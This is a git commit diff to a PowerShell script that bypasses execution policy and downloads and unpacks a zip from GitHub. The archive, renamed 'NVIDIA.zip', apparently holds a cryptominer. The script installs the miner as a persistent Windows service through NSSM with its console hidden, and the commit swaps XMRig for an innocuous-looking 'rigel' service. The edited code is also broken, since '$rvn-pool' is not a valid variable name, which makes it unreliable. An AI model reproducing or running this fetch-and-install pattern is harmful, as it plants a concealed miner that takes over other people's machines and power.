bb65a24eba08eef368ec107626d9b40394c1128f
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2026-07-22 08:30:27 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,12 +1,12 @@
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-$xmrigFolder = "C:\xmrig"
-$serviceName = "XMRig"
+$xmrigFolder = "C:\rigel"
+$serviceName = "rigel"
 New-Item -ItemType Directory -Force -Path $xmrigFolder | Out-Null
-$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
-$zipPath = "$env:TEMP\xmrig.zip"
+$zipUrl = "https://github.com/GALVINVN/GPU/releases/download/session/NVIDIA.zip"
+$zipPath = "$env:TEMP\NVIDIA.zip"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 Expand-Archive -Path $zipPath -DestinationPath $xmrigFolder -Force
-$xmrigExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "xmrig.exe" | Select-Object -First 1 -ExpandProperty FullName
+$rvn-pool = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "rvn-pool.bat" | Select-Object -First 1 -ExpandProperty FullName
 Invoke-WebRequest -Uri https://github.com/GALVINVN/system/raw/refs/heads/main/nssm-2.24.zip -OutFile C:\nssm-2.24.zip
 $nssmZipPath = "$env:C:\nssm-2.24.zip"
 Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
@@ -26,7 +26,7 @@ if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
     & $nssmExe stop $serviceName 2>$null
     & $nssmExe remove $serviceName confirm 2>$null
 }
-& $nssmExe install $serviceName $xmrigExe
+& $nssmExe install $serviceName $rvn-pool
 & $nssmExe set $serviceName AppParameters $appParams
 & $nssmExe set $serviceName AppDirectory $xmrigFolder
 & $nssmExe set $serviceName AppNoConsole 1
